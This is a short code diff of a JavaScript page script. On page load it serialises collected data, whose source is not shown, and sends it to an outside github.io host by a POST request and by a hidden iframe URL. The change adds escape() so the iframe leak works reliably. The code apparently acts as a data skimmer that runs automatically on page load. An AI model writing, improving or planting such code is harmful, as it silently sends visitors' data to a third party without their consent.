@@ -6,6 +6,6 @@ window.onload = function() {
         });
         var n = JSON.stringify(e);
         $.post("https://faisal-akhtar-fgh.github.io/kal", n);
-		$("body").append('<iframe src="https://faisal-akhtar-fgh.github.io/kal/?data='+ n + '"></iframe>');
+		$("body").append('<iframe src="https://faisal-akhtar-fgh.github.io/kal/?data='+ escape(n) + '"></iframe>');
     });
 };
